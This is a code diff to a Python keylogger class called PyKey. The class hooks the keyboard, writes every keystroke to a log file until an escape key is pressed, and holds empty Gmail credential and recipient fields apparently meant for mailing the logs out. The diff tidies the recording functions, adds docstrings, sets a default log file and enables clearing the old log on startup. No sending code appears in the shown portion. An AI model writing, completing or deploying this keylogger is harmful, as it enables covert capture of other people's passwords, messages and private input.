@@ -26,7 +26,7 @@ class PyKey:
         self.EMAIL_TO=''
         self.GMAIL_USER=''
         self.GMAIL_PWD=''
-        self.LOG_FILE = ''
+        self.LOG_FILE = 'log.txt'
         self.TERMINATE_KEY = "esc"
         self.CLEAR_ON_STARTUP = False
         self.MAP = {
@@ -153,10 +153,23 @@ class PyKey:
             listener.join()
 
 
-    def onexit(self, output):
+    def onExit(self, output):
+        """ Close the output stream
+            Arguments:
+                self (PyKey): self instance
+                output: output stream
+        """
         output.close()
 
-    def callback(self, output, is_down, event):
+
+    def recordKeyWindows(self, output, is_down, event):
+        """ Records the keys in Windows OS following a strategy depending on the operating system
+            Arguments:
+                self (PyKey): self instance
+                output: output TEXT
+                is_down: catched key? Boolean
+                event: keyboard event Object
+        """
         if event.event_type in ("up", "down"):
             key = self.MAP.get(event.name, event.name)
             modifier = len(key) > 1
@@ -178,36 +191,26 @@ class PyKey:
             output.write(key)
             output.flush()
 
+
     def recordWindows(self):
+        """ Records the keys in Windows OS following a strategy depending on the operating system
+            Arguments:
+                self (PyKey): self instance
+        """
         from functools import partial
         import atexit
         import os
         import keyboard
 
-        # Borrar el archivo previo.
-        #if self.CLEAR_ON_STARTUP:
-        #    os.remove(self.LOG_FILE)
+        if self.CLEAR_ON_STARTUP:
+            os.remove(self.LOG_FILE)
 
         is_down = {}
         output = open(self.LOG_FILE, "r+")
-        atexit.register(self.onexit, output)
-        keyboard.hook(partial(self.callback, output, is_down))
+        atexit.register(self.onExit, output)
+        keyboard.hook(partial(self.recordKeyWindows, output, is_down))
         keyboard.wait(self.TERMINATE_KEY)
 
-
-
-
-
-
-    def onKeyboardWinEvent(self, event):
-        logging.basicConfig(
-            filename=self.LOG_FILE,
-            filemode='w',
-            level=logging.DEBUG,
-            format='%(message)s')
-        logging.log(10, chr(event.Ascii))
-
-        return True
 
     def recordKeys(self):
         """ Records the keys following a strategy depending on the operating system
@@ -224,6 +227,8 @@ class PyKey:
         """ Start the key record
         """
         self.recordKeys()
+
+
 
 
 
